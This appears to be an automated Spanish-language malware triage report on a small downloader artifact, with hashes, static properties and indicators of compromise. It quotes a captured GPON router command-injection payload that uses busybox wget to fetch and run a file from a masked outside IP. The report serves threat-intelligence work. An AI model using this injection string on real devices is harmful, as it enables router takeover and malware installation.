# 🧬 Payload Analysis

`5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:01:51+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758`
- **SHA1:** `fd57b928acdbeec1fd37c3eeda2fa1fa6501fee0`
- **MD5:** `e7e2b643deac2d78f0f57004c1902cd2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 130 B |
| Entropía | 5.06 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 140.233.190.XXX | static_analysis |
| url | hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ger | strings |
| hash | 5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ | strings |
| ip | 179.130.237.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
